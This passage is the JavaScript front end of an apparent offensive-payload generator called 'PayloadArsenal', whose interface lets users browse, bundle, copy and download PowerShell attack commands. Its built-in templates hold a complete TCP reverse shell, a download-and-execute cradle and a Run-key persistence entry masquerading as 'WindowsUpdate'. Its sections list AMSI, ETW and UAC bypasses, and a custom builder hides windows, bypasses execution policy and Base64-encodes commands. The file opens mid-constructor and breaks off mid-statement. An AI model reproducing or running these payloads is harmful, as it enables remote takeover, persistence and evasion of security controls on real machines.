        this.currentTheme = localStorage.getItem('theme') || 'dark';
        this.searchTerm = '';
        this.activeFilters = {
            complexity: ['basic', 'intermediate', 'advanced', 'expert'],
            platform: ['windows', 'linux', 'macos']
        };
        this.favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
        this.payloadHistory = JSON.parse(localStorage.getItem('payloadHistory') || '[]');
        this.selectedPayloads = new Set();
        this.currentBulkOutput = null;
        this.performanceMetrics = {
            totalGenerations: 0,
            averageTime: 0,
            lastGenerated: null
        };
        this.templates = {
            download: 'IEX ((New-Object Net.WebClient).DownloadString("http://example.com/payload.ps1"))',
            reverse_shell: '$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
            persistence: 'New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -Command \\"IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/payload.ps1\')\\"" -PropertyType String -Force'
        };
        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupSearch();
        this.setupFilters();
        this.setupMobileNavigation();
        this.loadSection('basic');
        this.updateTheme();
        this.setupKeyboardShortcuts();
    }

    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const section = e.target.dataset.section;
                if (section) {
                    this.loadSection(section);
                }
            });
        });

        // Theme toggle
        const themeToggle = document.getElementById('themeToggle');
        if (themeToggle) {
            themeToggle.addEventListener('click', () => {
                this.toggleTheme();
            });
        }

        // Mobile menu toggle
        const menuToggle = document.getElementById('menuToggle');
        if (menuToggle) {
            menuToggle.addEventListener('click', () => {
                this.toggleMobileMenu();
            });
        }

        // Filter toggle
        const filterBtn = document.getElementById('filterBtn');
        if (filterBtn) {
            filterBtn.addEventListener('click', () => {
                this.toggleFilters();
            });
        }

        // Search
        const searchInput = document.getElementById('searchInput');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.performSearch(e.target.value);
            });
        }

        // Escape key handlers
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeOutput();
                this.closeModal();
                this.toggleFilters(false);
            }
        });
    }

    setupSearch() {
        const searchInput = document.getElementById('searchInput');
        if (!searchInput) return;

        // Debounced search
        let searchTimeout;
        searchInput.addEventListener('input', (e) => {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                this.performSearch(e.target.value);
            }, 300);
        });

        // Search shortcuts
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
                e.preventDefault();
                searchInput.focus();
            }
        });
    }

    setupFilters() {
        document.querySelectorAll('.filter-option input').forEach(checkbox => {
            checkbox.addEventListener('change', () => {
                this.updateFilters();
                this.filterPayloads();
            });
        });
    }

    setupMobileNavigation() {
        // Close sidebar when clicking outside
        document.addEventListener('click', (e) => {
            const sidebar = document.getElementById('sidebar');
            const menuToggle = document.getElementById('menuToggle');

            if (sidebar && menuToggle && window.innerWidth <= 1024 && 
                !sidebar.contains(e.target) && 
                !menuToggle.contains(e.target) && 
                sidebar.classList.contains('active')) {
                sidebar.classList.remove('active');
            }
        });

        // Handle window resize
        window.addEventListener('resize', () => {
            const sidebar = document.getElementById('sidebar');
            if (sidebar && window.innerWidth > 1024) {
                sidebar.classList.remove('active');
            }
        });
    }

    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            // Ctrl/Cmd + K for search
            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
                e.preventDefault();
                const searchInput = document.getElementById('searchInput');
                if (searchInput) searchInput.focus();
            }

            // Ctrl/Cmd + Enter to generate payload (when in custom builder)
            if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') {
                if (document.activeElement && document.activeElement.id === 'customCommand') {
                    this.buildCustomPayload();
                }
            }
        });
    }

    loadSection(sectionId) {
        // Update navigation
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.remove('active');
        });
        const navItem = document.querySelector(`[data-section="${sectionId}"]`);
        if (navItem) navItem.classList.add('active');

        // Update content
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        const section = document.getElementById(sectionId);
        if (section) section.classList.add('active');

        this.currentSection = sectionId;

        // Generate content for the section
        this.generateSectionContent(sectionId);

        // Close mobile menu
        const sidebar = document.getElementById('sidebar');
        if (sidebar && window.innerWidth <= 1024) {
            sidebar.classList.remove('active');
        }

        // Update URL without page reload
        history.pushState({section: sectionId}, '', `#${sectionId}`);
    }

    getSectionMap() {
        return {
            basic: ['sysinfo', 'processes', 'services', 'network'],
            filesystem: ['listfiles', 'findfiles', 'credentials_search'],
            security: ['currentuser', 'localusers', 'groups', 'privileges'],
            advanced: ['encoded', 'oneliner', 'registry', 'eventlogs'],
            edr: ['amsibypass', 'etw_bypass', 'scriptblock_bypass', 'constrained_bypass', 'reflective_loading', 'obfuscated_invoke'],
            lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution'],
            privilege: ['uac_bypass', 'token_manipulation', 'service_escalation', 'dll_hijacking'],
            quantum: ['quantum_safe_encryption', 'dns_steganography']
        };
    }

    generateSectionContent(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        const section = document.getElementById(sectionId);

        if (!section || sectionId === 'custom') return;

        const grid = section.querySelector('.payload-grid');
        if (!grid) return;

        grid.innerHTML = '';

        // Add section-wide actions
        if (sectionPayloads.length > 1) {
            const sectionActions = document.createElement('div');
            sectionActions.className = 'section-actions';
            sectionActions.innerHTML = `
                <button class="btn-primary" onclick="app.generateSectionAsLines('${sectionId}')" style="margin-bottom: 1rem;">
                    <i class="fas fa-layer-group"></i> Generate All as Lines (${sectionPayloads.length})
                </button>
                <button class="btn-secondary" onclick="app.selectAllInSection('${sectionId}')" style="margin-bottom: 1rem; margin-left: 0.5rem;">
                    <i class="fas fa-check-square"></i> Select All
                </button>
            `;
            grid.appendChild(sectionActions);
        }

        sectionPayloads.forEach(([key, payload]) => {
            const card = this.createPayloadCard(key, payload);
            grid.appendChild(card);
        });

        // Update section count
        const countElement = section.querySelector('.section-count');
        if (countElement) {
            countElement.textContent = `${sectionPayloads.length} techniques`;
        }
    }

    generateSectionAsLines(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);
        let lineOutput = '';
        let metadata = [];

        sectionPayloads.forEach(([key, payload], index) => {
            lineOutput += `${payload.command}${index < sectionPayloads.length - 1 ? '\n' : ''}`;
            metadata.push({
                name: this.formatTitle(key),
                complexity: payload.complexity,
                category: payload.category || 'General'
            });
        });

        // Show output panel
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) {
            outputPanel.classList.add('active');

            const payloadOutput = document.getElementById('payloadOutput');
            const description = document.getElementById('description');
            const metadataElement = document.getElementById('metadata');

            if (payloadOutput) payloadOutput.textContent = lineOutput;
            if (description) description.textContent = `${this.formatTitle(sectionId)} - All techniques as lines (${sectionPayloads.length} commands)`;

            if (metadataElement) {
                metadataElement.innerHTML = `
                    <div class="section-metadata">
                        <div class="metadata-item">
                            <strong>Section:</strong> ${this.formatTitle(sectionId)}
                        </div>
                        <div class="metadata-item">
                            <strong>Total Commands:</strong> ${sectionPayloads.length}
                        </div>
                        <div class="metadata-item">
                            <strong>Format:</strong> One command per line
                        </div>
                        <div class="metadata-item">
                            <strong>Generated:</strong> ${new Date().toLocaleString()}
                        </div>
                        <div class="metadata-item">
                            <strong>Total Length:</strong> ${lineOutput.length} characters
                        </div>
                        <div class="command-list">
                            ${metadata.map((item, index) => `
                                <div class="command-item">
                                    <span class="line-number">Line ${index + 1}:</span>
                                    <span class="name">${item.name}</span>
                                    <span class="complexity-${item.complexity}">${item.complexity}</span>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            }

            this.applySyntaxHighlighting();
            this.showNotification(`Generated ${sectionPayloads.length} ${this.formatTitle(sectionId)} commands as lines!`, 'success');
        }
    }

    selectAllInSection(sectionId) {
        const sectionPayloads = this.getPayloadsBySection(sectionId);

        sectionPayloads.forEach(([key]) => {
            this.selectedPayloads.add(key);
        });

        this.updateBulkUI();
        this.showNotification(`Selected all ${sectionPayloads.length} techniques from ${this.formatTitle(sectionId)}`, 'success');
    }

    getPayloadsBySection(sectionId) {
        const sectionMap = this.getSectionMap();
        const payloadKeys = sectionMap[sectionId] || [];
        return payloadKeys.map(key => [key, payloads[key]]).filter(([key, payload]) => payload);
    }

    createPayloadCard(key, payload) {
        const card = document.createElement('div');
        card.className = 'payload-card';
        card.dataset.complexity = payload.complexity;
        card.dataset.platform = payload.platform;

        const isFavorite = this.favorites.includes(key);

        card.innerHTML = `
            <div class="card-header">
                <h3>${this.formatTitle(key)}</h3>
                <div class="card-badges">
                    <span class="complexity-badge ${payload.complexity}">${payload.complexity}</span>
                    ${payload.evasion_rating ? `<span class="evasion-badge" title="Evasion Rating">${'★'.repeat(payload.evasion_rating)}</span>` : ''}
                </div>
            </div>
            <p class="card-description">${payload.description}</p>
            ${payload.warning ? `<div class="card-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
            <div class="card-tags">
                ${payload.tags ? payload.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('') : ''}
            </div>
            <div class="card-metadata">
                <span class="mitre-tag">MITRE: ${payload.mitre_id || 'N/A'}</span>
                <span class="detection-tag">Detection: ${payload.detection_difficulty || 'Unknown'}</span>
            </div>
            <div class="card-actions">
                <button class="btn-primary" onclick="app.generatePayload('${key}')">
                    <i class="fas fa-plus"></i> Select
                </button>
                <button class="btn-secondary" onclick="app.generateSinglePayload('${key}')">
                    <i class="fas fa-play"></i> Generate
                </button>
                <button class="btn-secondary" onclick="app.showPayloadDetails('${key}')">
                    <i class="fas fa-info"></i> Details
                </button>
                <button class="btn-icon ${isFavorite ? 'active' : ''}" onclick="app.toggleFavorite('${key}')" title="${isFavorite ? 'Remove from favorites' : 'Add to favorites'}">
                    <i class="fas fa-heart"></i>
                </button>
            </div>
        `;

        return card;
    }

    formatTitle(key) {
        return key.split('_').map(word => 
            word.charAt(0).toUpperCase() + word.slice(1)
        ).join(' ');
    }

    generatePayload(type) {
        this.selectedPayloads.add(type);
        this.updateBulkUI();
        this.showNotification(`Added "${this.formatTitle(type)}" to selection`, 'info');
    }

    generateSinglePayload(type) {
        const startTime = performance.now();
        const payload = payloads[type];
        if (!payload) return;

        // Add to history
        this.addToHistory(type, payload);

        // Update performance metrics
        this.performanceMetrics.totalGenerations++;
        this.performanceMetrics.lastGenerated = new Date();

        // Show output panel
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) {
            outputPanel.classList.add('active');

            const payloadOutput = document.getElementById('payloadOutput');
            const description = document.getElementById('description');
            const metadata = document.getElementById('metadata');

            if (payloadOutput) payloadOutput.textContent = payload.command;
            if (description) description.textContent = payload.description;

            if (metadata) {
                const endTime = performance.now();
                const generationTime = (endTime - startTime).toFixed(2);

                this.performanceMetrics.averageTime = 
                    (this.performanceMetrics.averageTime * (this.performanceMetrics.totalGenerations - 1) + parseFloat(generationTime)) 
                    / this.performanceMetrics.totalGenerations;

                metadata.innerHTML = `
                    <div class="metadata-grid">
                        <div class="metadata-item">
                            <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                        </div>
                        <div class="metadata-item">
                            <strong>Platform:</strong> ${payload.platform}
                        </div>
                        <div class="metadata-item">
                            <strong>Category:</strong> ${payload.category || 'General'}
                        </div>
                        <div class="metadata-item">
                            <strong>MITRE ATT&CK:</strong> ${payload.mitre_id || 'N/A'}
                        </div>
                        <div class="metadata-item">
                            <strong>Detection Difficulty:</strong> ${payload.detection_difficulty || 'Unknown'}
                        </div>
                        <div class="metadata-item">
                            <strong>Evasion Rating:</strong> ${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}
                        </div>
                        <div class="metadata-item">
                            <strong>Author:</strong> ${payload.author}
                        </div>
                        <div class="metadata-item">
                            <strong>Generated:</strong> ${new Date().toLocaleString()}
                        </div>
                        <div class="metadata-item">
                            <strong>Generation Time:</strong> ${generationTime}ms
                        </div>
                        <div class="metadata-item">
                            <strong>Payload Length:</strong> ${payload.command.length} characters
                        </div>
                        ${payload.warning ? `<div class="metadata-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
                    </div>
                `;
            }

            this.applySyntaxHighlighting();
            this.showNotification(`Payload "${this.formatTitle(type)}" generated successfully!`, 'success');
        }
    }

    updateBulkUI() {
        const bulkPanel = document.getElementById('bulkPanel');
        const selectedCount = document.getElementById('selectedCount');
        const selectedList = document.getElementById('selectedList');

        if (bulkPanel && selectedCount && selectedList) {
            if (this.selectedPayloads.size > 0) {
                bulkPanel.classList.add('active');
                selectedCount.textContent = this.selectedPayloads.size;

                selectedList.innerHTML = '';
                this.selectedPayloads.forEach(type => {
                    const item = document.createElement('div');
                    item.className = 'selected-item';
                    item.innerHTML = `
                        <span>${this.formatTitle(type)}</span>
                        <button onclick="app.removeFromSelection('${type}')" class="btn-remove">
                            <i class="fas fa-times"></i>
                        </button>
                    `;
                    selectedList.appendChild(item);
                });
            } else {
                bulkPanel.classList.remove('active');
            }
        }
    }

    removeFromSelection(type) {
        this.selectedPayloads.delete(type);
        this.updateBulkUI();
        this.showNotification(`Removed "${this.formatTitle(type)}" from selection`, 'info');
    }

    clearSelection() {
        this.selectedPayloads.clear();
        this.updateBulkUI();
        this.showNotification('Selection cleared', 'info');
    }

    generateBulkPayloads() {
        if (this.selectedPayloads.size === 0) {
            this.showNotification('No payloads selected', 'warning');
            return;
        }

        let bulkOutput = '';
        let bulkMetadata = [];
        let lineFormat = '';

        this.selectedPayloads.forEach((type, index) => {
            const payload = payloads[type];
            if (payload) {
                // Add to bulk output with headers
                bulkOutput += `# ${this.formatTitle(type)} - ${payload.category}\n`;
                bulkOutput += `# ${payload.description}\n`;
                bulkOutput += `${payload.command}\n\n`;

                // Add to line format (one command per line)
                lineFormat += `${payload.command}${index < this.selectedPayloads.size - 1 ? '\n' : ''}`;

                bulkMetadata.push({
                    name: this.formatTitle(type),
                    complexity: payload.complexity,
                    category: payload.category,
                    mitre: payload.mitre_id
                });
            }
        });

        // Show output panel
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) {
            outputPanel.classList.add('active');

            const payloadOutput = document.getElementById('payloadOutput');
            const description = document.getElementById('description');
            const metadata = document.getElementById('metadata');

            if (payloadOutput) payloadOutput.textContent = lineFormat;
            if (description) description.textContent = `Multiple payloads generated (${this.selectedPayloads.size} techniques) - One per line`;

            if (metadata) {
                metadata.innerHTML = `
                    <div class="bulk-metadata">
                        <div class="metadata-item">
                            <strong>Total Payloads:</strong> ${this.selectedPayloads.size}
                        </div>
                        <div class="metadata-item">
                            <strong>Format:</strong> Multiple lines (one command per line)
                        </div>
                        <div class="metadata-item">
                            <strong>Generated:</strong> ${new Date().toLocaleString()}
                        </div>
                        <div class="metadata-item">
                            <strong>Total Length:</strong> ${lineFormat.length} characters
                        </div>
                        <div class="metadata-item">
                            <strong>Lines:</strong> ${this.selectedPayloads.size}
                        </div>
                        <div class="bulk-list">
                            ${bulkMetadata.map((item, index) => `
                                <div class="bulk-item">
                                    <span class="name">Line ${index + 1}: ${item.name}</span>
                                    <span class="complexity-${item.complexity}">${item.complexity}</span>
                                    <span class="category">${item.category}</span>
                                </div>
                            `).join('')}
                        </div>
                        <div class="format-options" style="margin-top: 1rem;">
                            <button class="btn-secondary" onclick="app.toggleOutputFormat('detailed')" style="margin-right: 0.5rem;">
                                <i class="fas fa-list"></i> Detailed View
                            </button>
                            <button class="btn-secondary" onclick="app.toggleOutputFormat('lines')">
                                <i class="fas fa-align-left"></i> Lines Only
                            </button>
                        </div>
                    </div>
                `;
            }

            // Store both formats for toggling
            this.currentBulkOutput = {
                detailed: bulkOutput,
                lines: lineFormat
            };

            this.applySyntaxHighlighting();
            this.showNotification(`Generated ${this.selectedPayloads.size} payloads as lines!`, 'success');
        }
    }

    toggleOutputFormat(format) {
        if (!this.currentBulkOutput) return;

        const outputElement = document.getElementById('payloadOutput');
        if (outputElement) {
            if (format === 'detailed') {
                outputElement.textContent = this.currentBulkOutput.detailed;
                this.showNotification('Switched to detailed format', 'info');
            } else {
                outputElement.textContent = this.currentBulkOutput.lines;
                this.showNotification('Switched to lines format', 'info');
            }

            this.applySyntaxHighlighting();
        }
    }

    showPayloadDetails(type) {
        const payload = payloads[type];
        if (!payload) return;

        const modal = document.getElementById('detailsModal');
        const modalTitle = document.getElementById('modalTitle');
        const modalBody = document.getElementById('modalBody');

        if (modal && modalTitle && modalBody) {
            modalTitle.textContent = this.formatTitle(type) + ' - Detailed Information';

            modalBody.innerHTML = `
                <div class="payload-details">
                    <div class="detail-section">
                        <h4><i class="fas fa-info-circle"></i> Overview</h4>
                        <p>${payload.description}</p>
                    </div>

                    <div class="detail-section">
                        <h4><i class="fas fa-code"></i> Command</h4>
                        <div class="code-preview">
                            <pre><code>${payload.command}</code></pre>
                            <button class="copy-btn" onclick="app.copyText('${payload.command.replace(/'/g, '\\\'')}')" title="Copy command">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>

                    <div class="detail-section">
                        <h4><i class="fas fa-chart-line"></i> Technical Details</h4>
                        <div class="detail-grid">
                            <div class="detail-item">
                                <span class="label">Complexity:</span>
                                <span class="value complexity-${payload.complexity}">${payload.complexity}</span>
                            </div>
                            <div class="detail-item">
                                <span class="label">Platform:</span>
                                <span class="value">${payload.platform}</span>
                            </div>
                            <div class="detail-item">
                                <span class="label">Category:</span>
                                <span class="value">${payload.category || 'General'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="label">MITRE ATT&CK:</span>
                                <span class="value">${payload.mitre_id || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="label">Detection Difficulty:</span>
                                <span class="value">${payload.detection_difficulty || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="label">Evasion Rating:</span>
                                <span class="value">${'★'.repeat(payload.evasion_rating || 1)}${'☆'.repeat(5 - (payload.evasion_rating || 1))}</span>
                            </div>
                        </div>
                    </div>

                    ${payload.tags ? `
                    <div class="detail-section">
                        <h4><i class="fas fa-tags"></i> Tags</h4>
                        <div class="tags">
                            ${payload.tags.map(tag => `<span class="tag">${tag}</span>`).join('')}
                        </div>
                    </div>
                    ` : ''}

                    ${payload.warning ? `
                    <div class="detail-section warning-section">
                        <h4><i class="fas fa-exclamation-triangle"></i> Warning</h4>
                        <p class="warning-text">${payload.warning}</p>
                    </div>
                    ` : ''}

                    <div class="detail-section">
                        <h4><i class="fas fa-book"></i> Usage Guidelines</h4>
                        <ul class="guidelines">
                            <li>Use only in authorized testing environments</li>
                            <li>Follow responsible disclosure practices</li>
                            <li>Ensure proper documentation of testing activities</li>
                            <li>Consider legal and ethical implications</li>
                            <li>Respect privacy and data protection regulations</li>
                        </ul>
                    </div>
                </div>
            `;

            modal.classList.add('active');
        }
    }

    buildCustomPayload() {
        const customCommand = document.getElementById('customCommand');
        const encodeBase64 = document.getElementById('encodeBase64');
        const hiddenWindow = document.getElementById('hiddenWindow');
        const bypassPolicy = document.getElementById('bypassPolicy');

        if (!customCommand || !customCommand.value.trim()) {
            this.showNotification('Please enter a PowerShell command first.', 'warning');
            return;
        }

        let finalPayload = customCommand.value.trim();
        let description = 'Custom PowerShell command';

        // Build the command with options
        let commandArgs = [];

        if (hiddenWindow && hiddenWindow.checked) {
            commandArgs.push('-WindowStyle Hidden');
            description += ' (hidden window)';
        }

        if (bypassPolicy && bypassPolicy.checked) {
            commandArgs.push('-ExecutionPolicy Bypass', '-NoProfile');
            description += ' (bypass execution policy)';
        }

        if (encodeBase64 && encodeBase64.checked) {
            // Convert to Base64
            const bytes = new TextEncoder().encode(customCommand.value);
            const base64 = btoa(String.fromCharCode(...bytes));
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -EncodedCommand ${base64}`;
            description += ' (Base64 encoded)';
        } else {
            finalPayload = `powershell.exe ${commandArgs.join(' ')} -Command "${customCommand.value.replace(/"/g, '\\"')}"`;
        }

        // Show output
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) {
            outputPanel.classList.add('active');

            const payloadOutput = document.getElementById('payloadOutput');
            const descriptionElement = document.getElementById('description');
            const metadata = document.getElementById('metadata');

            if (payloadOutput) payloadOutput.textContent = finalPayload;
            if (descriptionElement) descriptionElement.textContent = description;
            if (metadata) {
                metadata.innerHTML = `
                    <div class="metadata-grid">
                        <div class="metadata-item">
                            <strong>Type:</strong> Custom Payload
                        </div>
                        <div class="metadata-item">
                            <strong>Generated:</strong> ${new Date().toLocaleString()}
                        </div>
                        <div class="metadata-item">
                            <strong>Author:</strong> User (0x0806 Platform)
                        </div>
                        <div class="metadata-item">
                            <strong>Options:</strong> ${[
                                hiddenWindow && hiddenWindow.checked ? 'Hidden Window' : null,
                                bypassPolicy && bypassPolicy.checked ? 'Bypass Policy' : null,
                                encodeBase64 && encodeBase64.checked ? 'Base64 Encoded' : null
                            ].filter(Boolean).join(', ') || 'None'}
                        </div>
                        <div class="metadata-item">
                            <strong>Payload Length:</strong> ${finalPayload.length} characters
                        </div>
                        <div class="metadata-item">
                            <strong>Original Length:</strong> ${customCommand.value.length} characters
                        </div>
                    </div>
                `;
            }

            this.applySyntaxHighlighting();
            this.showNotification('Custom payload generated successfully!', 'success');
        }
    }

    loadTemplate(templateName) {
        const template = this.templates[templateName];
        if (template) {
            const customCommand = document.getElementById('customCommand');
            if (customCommand) {
                customCommand.value = template;
                this.showNotification(`Template "${templateName}" loaded successfully!`, 'success');
            }
        }
    }

    performSearch(term) {
        this.searchTerm = term.toLowerCase();
        this.filterPayloads();
    }

    filterPayloads() {
        const cards = document.querySelectorAll('.payload-card');
        let visibleCount = 0;

        cards.forEach(card => {
            const title = card.querySelector('h3');
            const description = card.querySelector('.card-description');
            const tags = card.querySelectorAll('.tag');
            const complexity = card.dataset.complexity;
            const platform = card.dataset.platform;

            const titleText = title ? title.textContent.toLowerCase() : '';
            const descriptionText = description ? description.textContent.toLowerCase() : '';
            const tagTexts = Array.from(tags).map(tag => tag.textContent.toLowerCase());

            const matchesSearch = !this.searchTerm || 
                titleText.includes(this.searchTerm) || 
                descriptionText.includes(this.searchTerm) ||
                tagTexts.some(tag => tag.includes(this.searchTerm));

            const matchesComplexity = this.activeFilters.complexity.includes(complexity);
            const matchesPlatform = this.activeFilters.platform.includes(platform);

            if (matchesSearch && matchesComplexity && matchesPlatform) {
                card.style.display = 'block';
                visibleCount++;
            } else {
                card.style.display = 'none';
            }
        });

        // Update section count
        const countElement = document.querySelector(`#${this.currentSection} .section-count`);
        if (countElement) {
            countElement.textContent = `${visibleCount} techniques`;
        }
    }

    updateFilters() {
        const complexityFilters = Array.from(document.querySelectorAll('.filter-option input[value^="basic"], .filter-option input[value^="intermediate"], .filter-option input[value^="advanced"], .filter-option input[value^="expert"]'))
            .filter(input => input.checked)
            .map(input => input.value);

        const platformFilters = Array.from(document.querySelectorAll('.filter-option input[value^="windows"], .filter-option input[value^="linux"], .filter-option input[value^="macos"]'))
            .filter(input => input.checked)
            .map(input => input.value);

        this.activeFilters = {
            complexity: complexityFilters,
            platform: platformFilters
        };
    }

    toggleTheme() {
        this.currentTheme = this.currentTheme === 'dark' ? 'light' : 'dark';
        this.updateTheme();

        // Update icon
        const icon = document.querySelector('#themeToggle i');
        if (icon) {
            icon.className = this.currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
        }

        // Save preference
        localStorage.setItem('theme', this.currentTheme);

        this.showNotification(`Switched to ${this.currentTheme} theme`, 'info');
    }

    updateTheme() {
        document.documentElement.setAttribute('data-theme', this.currentTheme);
    }

    toggleMobileMenu() {
        const sidebar = document.getElementById('sidebar');
        if (sidebar) {
            sidebar.classList.toggle('active');
        }
    }

    toggleFilters(show = null) {
        const panel = document.getElementById('filterPanel');
        if (panel) {
            if (show === null) {
                panel.classList.toggle('active');
            } else if (show) {
                panel.classList.add('active');
            } else {
                panel.classList.remove('active');
            }
        }
    }

    toggleFavorite(payloadKey) {
        const index = this.favorites.indexOf(payloadKey);
        if (index > -1) {
            this.favorites.splice(index, 1);
            this.showNotification(`Removed from favorites`, 'info');
        } else {
            this.favorites.push(payloadKey);
            this.showNotification(`Added to favorites`, 'success');
        }

        localStorage.setItem('favorites', JSON.stringify(this.favorites));

        // Update UI
        this.generateSectionContent(this.currentSection);
    }

    addToHistory(type, payload) {
        const historyItem = {
            type,
            payload: payload.command,
            timestamp: new Date().toISOString(),
            description: payload.description
        };

        this.payloadHistory.unshift(historyItem);

        // Keep only last 50 items
        if (this.payloadHistory.length > 50) {
            this.payloadHistory = this.payloadHistory.slice(0, 50);
        }

        localStorage.setItem('payloadHistory', JSON.stringify(this.payloadHistory));
    }

    closeOutput() {
        const outputPanel = document.getElementById('outputPanel');
        if (outputPanel) {
            outputPanel.classList.remove('active');
        }
    }

    closeModal() {
        const detailsModal = document.getElementById('detailsModal');
        if (detailsModal) {
            detailsModal.classList.remove('active');
        }
    }

    applySyntaxHighlighting() {
        const codeElement = document.querySelector('#payloadOutput');
        if (!codeElement) return;

        let code = codeElement.textContent;

        // PowerShell syntax highlighting
        const patterns = [
            { pattern: /\b(Get-|Set-|New-|Remove-|Add-|Start-|Stop-|Invoke-|Import-|Export-)[A-Za-z]+/g, class: 'ps-cmdlet' },
            { pattern: /\$[A-Za-z_][A-Za-z0-9_]*/g, class: 'ps-variable' },
            { pattern: /-[A-Za-z]+/g, class: 'ps-parameter' },
            { pattern: /'[^']*'/g, class: 'ps-string' },
            { pattern: /"[^"]*"/g, class: 'ps-string' },
            { pattern: /\b(if|else|elseif|foreach|for|while|do|switch|function|param|begin|process|end)\b/g, class: 'ps-keyword' },
            { pattern: /\b(try|catch|finally|throw)\b/g, class: 'ps-keyword' },
            { pattern: /\b\d+\b/g, class: 'ps-number' },
            { pattern: /#.*$/gm, class: 'ps-comment' }
        ];

        patterns.forEach(({pattern, class: className}) => {
            code = code.replace(pattern, `<span class="${className}">$&</span>`);
        });

        codeElement.innerHTML = code;
    }

    copyToClipboard() {
        const output = document.getElementById('payloadOutput');
        if (!output) return;

        const text = output.textContent;

        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Payload copied to clipboard!', 'success');
            }).catch(() => {
                this.fallbackCopyToClipboard(text);
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    copyText(text) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(text).then(() => {
                this.showNotification('Command copied to clipboard!', 'success');
            });
        } else {
            this.fallbackCopyToClipboard(text);
        }
    }

    fallbackCopyToClipboard(text) {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        try {
            document.execCommand('copy');
            this.showNotification('Copied to clipboard!', 'success');
        } catch (err) {
            this.showNotification('Failed to copy to clipboard', 'error');
        }

        document.body.removeChild(textArea);
    }

    downloadPayload() {
        const output = document.getElementById('payloadOutput');
        if (!output) return;

        const text = output.textContent;
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const blob = new Blob([text], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);

        const a = document.createElement('a');
        a.href = url;
        a.download = `payload_arsenal_${timestamp}.ps1`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        this.showNotification('Payload downloaded successfully!', 'success');
    }

    showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : type === 'warning' ? 'exclamation-triangle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
        `;

        document.body.appendChild(notification);

        setTimeout(() => notification.classList.add('show'), 100);

        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (notification.parentNode) {
                    document.body.removeChild(notification);
                }
            }, 300);
        }, 3000);
    }
}

// Global functions for backward compatibility
function generatePayload(type) {
    if (window.app) app.generatePayload(type);
}

function buildCustomPayload() {
    if (window.app) app.buildCustomPayload();
}

function copyToClipboard() {
    if (window.app) app.copyToClipboard();
}

function downloadPayload() {
    if (window.app) app.downloadPayload();
}

function showPayloadDetails(type) {
    if (window.app) app.showPayloadDetails(type);
}

function closeOutput() {
    if (window.app) app.closeOutput();
}

function closeModal() {
    if (window.app) app.closeModal();
}

// Initialize application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.app = new PayloadArsenal();
});

// Handle browser back/forward buttons
window.addEventListener('popstate', (e) => {
    if (e.state && e.state.section && window.app) {
        app.loadSection(e.state.section);
    }
});

// Load section from URL hash on page load
window.addEventListener('load', () => {
    if (window.app) {
        const hash = window.location.hash.substring(1);
        if (hash && app.getSectionMap()[hash]) {
            app.loadSection(hash);
        }
    }
});

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
